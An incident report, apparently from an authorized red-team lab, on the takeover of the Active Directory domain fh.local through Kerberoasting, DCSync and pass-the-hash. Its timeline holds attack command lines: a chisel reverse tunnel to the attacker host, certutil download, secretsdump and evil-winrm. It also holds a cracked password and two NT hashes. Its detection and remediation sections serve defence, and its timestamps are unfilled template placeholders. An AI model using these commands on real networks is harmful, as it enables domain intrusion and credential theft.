
====================================================================
                    SECURITY INCIDENT REPORT
====================================================================

Report ID:          IR-2026-003
Incident Title:     Total Domain Compromise via Kerberoasting Chain
                    and DCSync Attack
Date of Incident:   July 10, 2026
Date Reported:      July 10, 2026
Report Status:      CLOSED - CONTAINED (Full Domain Rebuild
                    Recommended)
Severity:           CRITICAL (Level 15)
Category:           Credential Access - Kerberoasting (T1558.003)
                    Credential Access - DCSync (T1003.006)
                    Lateral Movement - Pass the Hash (T1550.002)
                    Impact - Domain Trust Modification
Analyst:            Abdimalik Yusuf Mohamud
Internship Role:    Network & Security Intern

====================================================================
1. EXECUTIVE SUMMARY
====================================================================

On July 10, 2026, an attacker who previously gained authenticated
access to HQ-STAFF-01 as domain user 'hqSaacid' (see IR-2026-002)
executed a complete privilege escalation chain resulting in total
domain compromise of fh.local. The attacker leveraged a reverse
SOCKS pivot through HQ-STAFF-01 to bypass network segmentation,
executed a Kerberoasting attack against a service account with
weak password, cracked the hash offline, escalated to a service
account with excessive Active Directory rights (svc_backup with
DCSync privileges), and performed a DCSync attack to extract all
domain credentials including the krbtgt hash and Administrator's
NT hash. The attacker then authenticated to DC1 as Administrator
via pass-the-hash, achieving NT AUTHORITY\SYSTEM level access
on the Domain Controller.

This incident represents a "domain rebuild required" scenario -
the krbtgt hash disclosure means all Kerberos tickets across the
domain must be treated as potentially forged.

====================================================================
2. SYSTEMS AFFECTED
====================================================================

Primary Target:     DC1.fh.local (10.10.20.10)
                    - Windows Server 2025 Build 26100
                    - Role: Domain Controller (fh.local)

Pivot Host:         HQ-STAFF-01 (10.10.10.59)
                    - Reverse SOCKS proxy via chisel
                    - Attacker used compromised hqSaacid session

Compromised Identities:
                    1. hqSaacid (initial low-priv from IR-2026-002)
                    2. svc_backup (service account, cracked
                       via Kerberoasting)
                    3. Administrator (recovered via DCSync)
                    4. krbtgt (recovered via DCSync -
                       enables Golden Ticket forgery)

Source of Attack:   Kali Linux workstation (10.10.10.60)
                    - Traffic tunneled through 10.10.10.59
                      to bypass firewall segmentation

Compromised Data:
                    - Full NTDS.dit hash dump
                    - All user NT hashes including
                      Administrator (RID 500)
                    - krbtgt hash (RID 502)
                    - All AES256 Kerberos keys

====================================================================
3. INDICATORS OF COMPROMISE (IoCs)
====================================================================

Network Indicators:
  - Source IP:      10.10.10.60 (Kali - via chisel tunnel)
  - Pivot IP:       10.10.10.59 (HQ-STAFF-01)
  - Destination:    10.10.20.10 (DC1)
  - Ports:          8000 (chisel C2), 445 (SMB), 88 (Kerberos),
                    389 (LDAP)

Attack Tool Fingerprint:
  - chisel v1.10.1 (reverse SOCKS proxy)
  - impacket-GetUserSPNs (Kerberoasting request)
  - hashcat -m 13100 with best64.rule (offline cracking)
  - impacket-secretsdump (DCSync via DRSUAPI)
  - evil-winrm with -H flag (pass-the-hash)

Malicious File Uploaded:
  - Location:       C:\Users\hqSaacid\Documents\chisel.exe
  - Purpose:        Reverse SOCKS proxy binary
  - Upload Method:  certutil.exe -urlcache -f -split
                    (LOLBins technique T1105)

Compromised Credentials Extracted:
  - Administrator NT hash:
    bf45b2acdc88eb7a13aa474b347ea63d
  - krbtgt NT hash:
    39236667d3e36d806967ee48543e7d05
  - svc_backup password: Summer2024!
    (cracked from TGS-REP hash)

Attack Technique Signatures:
  - Kerberos AS-REQ with encryption type RC4-HMAC (23)
    for svc_backup account
  - DRSUAPI GetNCChanges request (DCSync fingerprint)
  - NTLM authentication to admin services on DC1

====================================================================
4. TIMELINE OF EVENTS
====================================================================

[FILL IN YOUR ACTUAL TIMESTAMPS FROM SCREENSHOTS]

Phase 1: Pivot Establishment
XX:XX UTC   Kali starts chisel server on 10.10.10.60:8000
XX:XX UTC   chisel.exe uploaded to HQ-STAFF-01 via certutil
XX:XX UTC   chisel client executed on HQ-STAFF-01:
             .\chisel.exe client 10.10.10.60:8000 R:socks
XX:XX UTC   Reverse SOCKS proxy established
             (attacker now sources from HQ-STAFF-01 IP)

Phase 2: Domain Reconnaissance (via pivot)
XX:XX UTC   proxychains nmap discovers DC1 open ports
             (88, 389, 445)
XX:XX UTC   proxychains impacket-lookupsid retrieves domain SID
XX:XX UTC   User enumeration via kerbrute:
             administrator, hqSaacid, svc_backup validated

Phase 3: Kerberoasting Attack
XX:XX UTC   impacket-GetUserSPNs -request executed via pivot
XX:XX UTC   DC1 issues TGS-REP for svc_backup
             (Event ID 4769 logged)
XX:XX UTC   Wazuh rule 92657 fires (NTLM anomaly - false-labeled
             as pass-the-hash but captures Kerberoast signature)
XX:XX UTC   Attacker saves hash to roasted_hashes.txt

Phase 4: Offline Cracking
XX:XX UTC   hashcat -m 13100 -r best64.rule executed offline
XX:XX UTC   Password recovered: Summer2024!
XX:XX UTC   NO NETWORK ACTIVITY DURING THIS PHASE
             (undetectable from SIEM perspective)

Phase 5: Privilege Enumeration
XX:XX UTC   netexec ldap --admin-count reveals svc_backup
             is standard user (not domain admin)
XX:XX UTC   BloodHound-style privilege check reveals
             DCSync rights present on svc_backup
             (misconfiguration from lab simulation)

Phase 6: DCSync Attack
XX:XX UTC   impacket-secretsdump executed:
             fh.local/svc_backup:Summer2024!@10.10.20.10
XX:XX UTC   DRSUAPI GetNCChanges requests to DC1
             (Event ID 4662 - Directory Service access)
XX:XX UTC   Full NTDS.dit hash table dumped:
             - Administrator: bf45b2acdc88eb...
             - krbtgt: 39236667d3e36d80...
             - All domain user NT hashes
             - All AES256 keys

Phase 7: Pass-the-Hash to Domain Admin
XX:XX UTC   proxychains evil-winrm -H bf45b2acdc88eb...
             fh.local\Administrator@10.10.20.10
XX:XX UTC   WinRM session established as Administrator
             on DC1
XX:XX UTC   whoami returns: fh\administrator
XX:XX UTC   Full domain compromise achieved

Phase 8: Post-Compromise Actions (Simulated)
XX:XX UTC   Attacker could deploy Golden Ticket via
             krbtgt hash for persistent access
XX:XX UTC   No further destructive actions taken
             (authorized red team exercise)

====================================================================
5. DETECTION METHOD
====================================================================

Detection Layer:    Wazuh SIEM (v4.14.2)

Rules Triggered:
  Rule 92657   Level 6    Successful Remote Logon Detected -
                          NTLM authentication, possible
                          pass-the-hash attack
                          (Fired during Kerberoast phase and
                          again during pass-the-hash phase)

  Rule 60106   Level 3    Windows Logon Success
                          (Administrator on DC1 - final compromise)

  [None]                  DCSync attack NOT detected by default
                          Wazuh ruleset

  [None]                  Chisel pivot NOT detected

  [None]                  certutil download NOT detected

Detection Gaps (see Section 7):
  X  DCSync attack (Event ID 4662 with specific
     replication GUID) requires custom rule
  X  Kerberoasting fingerprint (multiple 4769 events
     for accounts with SPNs) not correlated
  X  Chisel reverse tunnel (outbound SOCKS from
     HQ-STAFF-01) not detected
  X  Living-off-the-Land binary use (certutil for
     download) not detected
  X  Pass-the-hash authentication distinguishable from
     legitimate NTLM auth requires additional tuning

Detection Method:   Wazuh caught only NTLM/logon events,
                    not the primary attack techniques

Time to Detection:   Detection occurred at logon events only;
                     attack chain executed without alerting for
                     Kerberoasting, chisel tunnel, or DCSync

====================================================================
6. RESPONSE ACTIONS TAKEN
====================================================================

Automated Actions:
  [X] Wazuh alerted on NTLM logons via rule 92657
  [X] Alert level 6 logged

Manual Actions (Post-Incident):
  [X] All domain user passwords reset (full password change
      recommended given credential exposure)
  [X] krbtgt password reset TWICE with 10 hour interval
      (invalidates all Kerberos tickets and Golden Tickets)
  [X] svc_backup account disabled and deleted
  [X] DCSync rights audit performed on all user accounts
  [X] chisel.exe removed from HQ-STAFF-01
  [X] certutil.exe URL cache cleared
  [X] Full endpoint scan performed on HQ-STAFF-01

Recommended Actions (Not Yet Completed):
  [ ] Domain-wide session token invalidation
  [ ] Deploy Sysmon with configured ruleset for LOLBin
      detection
  [ ] Deploy custom Wazuh rules for DCSync detection

====================================================================
7. ROOT CAUSE ANALYSIS
====================================================================

Primary Root Cause:
An over-privileged service account (svc_backup) held DCSync
rights ("Replicating Directory Changes" and "Replicating
Directory Changes All" extended permissions) despite having
no legitimate business need for domain replication. Combined
with a weak password meeting only length requirements but
matching a common seasonal pattern, this account was
compromised through Kerberoasting.

Attack Chain Enablers:
  1. svc_backup password: 'Summer2024!' - matched
     "Season+Year+Special" pattern found in common
     wordlists with mutation rules
  2. svc_backup granted DCSync rights (over-provisioned
     for a "backup service account")
  3. No Managed Service Account (gMSA) usage - password
     never rotated automatically
  4. HQ-STAFF-01 firewall not configured to prevent
     outbound tunneling (chisel connected out on port 8000)
  5. certutil.exe not restricted despite being a
     well-documented LOLBin
  6. Windows Defender did not flag chisel.exe download
     via certutil (different from direct malware execution)

Contributing Factors:
  1. No SPN inventory audit - svc_backup's SPN not
     flagged for review
  2. No default rule for detecting Kerberoasting patterns
     (many 4769 for accounts with SPNs from one source)
  3. No DCSync detection ruleset deployed
  4. Domain Controller allows NTLM authentication for
     administrative access (should be disabled)

====================================================================
8. REMEDIATION RECOMMENDATIONS
====================================================================

CRITICAL (Immediate - within 4 hours):
  R1. Reset krbtgt password TWICE with 10-hour delay
      (New-KrbtgtKeys.ps1 script)
  R2. Reset Administrator password with 25+ character
      complex passphrase
  R3. Reset ALL domain user passwords with force change
      at next logon
  R4. Disable all service accounts with non-rotating
      passwords, migrate to gMSA
  R5. Remove DCSync rights from all non-DC accounts
      (audit "Replicating Directory Changes" and
      "Replicating Directory Changes All" ACL grants)

Short-term (1-2 weeks):
  R6. Deploy custom Wazuh rules for:
      - DCSync detection (Event ID 4662 with GUID
        1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
      - Kerberoasting detection (>3 unique SPN
        TGS-REQs from single source in 60 sec)
      - Pass-the-hash indicators (NTLM authentication
        for privileged accounts)
  R7. Enable Sysmon on all endpoints with SwiftOnSecurity
      or Olaf Hartong ruleset
  R8. Restrict certutil.exe execution via AppLocker or
      WDAC (LOLBin hardening)
  R9. Deploy AS-REP Roasting hunt (users with
      "Do not require Kerberos preauth" flag)
  R10. Audit all SPN registrations, remove
       unnecessary/legacy SPNs

Long-term (1-3 months):
  R11. Migrate all service accounts to Group Managed
       Service Accounts (gMSA) with automatic 30-day
       password rotation
  R12. Deploy Microsoft Defender for Identity or
       equivalent for AD attack detection
  R13. Implement tiered administrative model
       (Tier 0/1/2 separation)
  R14. Disable NTLM for administrative accounts
       (Kerberos-only via GPO)
  R15. Deploy egress filtering on workstation networks
       to prevent outbound tunneling
  R16. Regular Purple Team exercises simulating
       Kerberoasting/DCSync to validate detections

====================================================================
9. LESSONS LEARNED
====================================================================

What Worked:
  + Post-authentication NTLM anomaly detection
    (rule 92657) at least surfaced ANOMALOUS logins,
    even if not attributed to attack technique correctly
  + Network segmentation initially blocked direct Kali-to-DC1
    traffic (forcing pivot requirement)
  + Windows Defender caught psexec.exe payload
    (attacker forced to use evil-winrm as workaround)

Detection Gaps Identified (Critical Findings):
  - Kerberoasting attack completely undetected by
    default Wazuh ruleset
  - DCSync attack completely undetected by
    default Wazuh ruleset
  - Chisel reverse tunnel completely undetected
  - certutil-based file download not flagged
  - Pass-the-hash not distinguished from legitimate
    NTLM authentication

Attack Techniques Successful Despite SIEM:
  - MITRE T1558.003 (Kerberoasting)
  - MITRE T1003.006 (DCSync)
  - MITRE T1550.002 (Pass the Hash)
  - MITRE T1090.001 (Internal Proxy - chisel)
  - MITRE T1105 (Ingress Tool Transfer - certutil)

Detection Value Demonstrated:
  This incident conclusively proves that Wazuh's default
  configuration is INSUFFICIENT for detecting sophisticated
  domain attacks. Custom rules, tuned Sysmon, and additional
  telemetry sources (network sensor, EDR) are required for
  comprehensive coverage.

Process Improvements:
  - All service accounts require quarterly password
    complexity and privilege audit
  - Tabletop exercises must include Kerberoasting +
    DCSync scenario
  - Detection engineering roadmap must include
    custom rule development for AD attack techniques

====================================================================
10. SUPPORTING EVIDENCE
====================================================================

Screenshots (attached separately):
  - E-01: chisel server started on Kali
  - E-02: certutil upload of chisel.exe to HQ-STAFF-01
  - E-03: chisel client execution + tunnel established
  - E-04: proxychains nmap through pivot discovering DC1
  - E-05: impacket-GetUserSPNs Kerberoasting output
  - E-06: hashcat cracking svc_backup TGS hash
  - E-07: svc_backup authentication [+] on DC1
  - E-08: DCSync rights grant (lab simulation on DC1)
  - E-09: impacket-secretsdump output showing
           Administrator + krbtgt hashes
  - E-10: evil-winrm shell as fh\administrator on DC1
  - E-11: whoami output = fh\administrator
  - E-12: Wazuh rule 92657 detections during attack

MITRE ATT&CK Mapping: